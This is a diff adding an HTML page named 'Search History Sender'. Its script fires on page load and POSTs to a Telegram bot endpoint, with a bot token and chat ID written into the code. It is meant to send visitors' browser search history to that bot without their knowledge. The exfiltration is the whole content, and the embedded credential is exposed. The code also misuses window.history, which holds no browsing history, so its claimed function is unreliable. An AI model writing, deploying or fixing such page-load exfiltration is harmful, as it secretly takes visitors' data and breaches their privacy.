@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Search History Sender</title>
+</head>
+<body>
+  <h1>Test for sending the history</h1>
+
+  <script>
+    // Function to send the search history to a Telegram bot
+    function sendSearchHistory() {
+      // Get the browser's search history
+      var history = window.history;
+
+      // Create a new HTTP request
+      var xhr = new XMLHttpRequest();
+
+      // Configure the request
+      xhr.open("POST", "https://api.telegram.org/bot5821551335:AAGR_IE5_4mAR_W_c4YFxTL19mm8puKI3xs/sendMessage", true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+
+      // Create the message to send
+      var message = {
+        chat_id: "5879421948",
+        text: "Search History:\n\n" + history
+      };
+
+      // Convert the message to JSON
+      var jsonMessage = JSON.stringify(message);
+
+      // Send the request
+      xhr.send(jsonMessage);
+    }
+
+    // Call the function when the website is loaded
+    window.onload = sendSearchHistory;
+  </script>
+</body>
+</html>
